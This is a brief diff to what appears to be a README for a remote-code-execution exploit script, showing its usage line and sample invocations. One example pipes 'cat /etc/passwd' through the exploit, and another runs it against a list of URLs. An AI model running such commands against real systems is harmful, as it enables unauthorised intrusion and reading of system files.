@@ -15,7 +15,6 @@ bash scanner.sh
 #### RCE:
 ```
 exploit.py [-h] [-u URL] [-c COMMAND] [-f FILE]
-python3 exploit.py -u https://127.0.0.1
 python3 exploit.py -u https://127.0.0.1 -c 'cat /etc/passwd'
 python3 exploit.py -f urls.txt
 ```
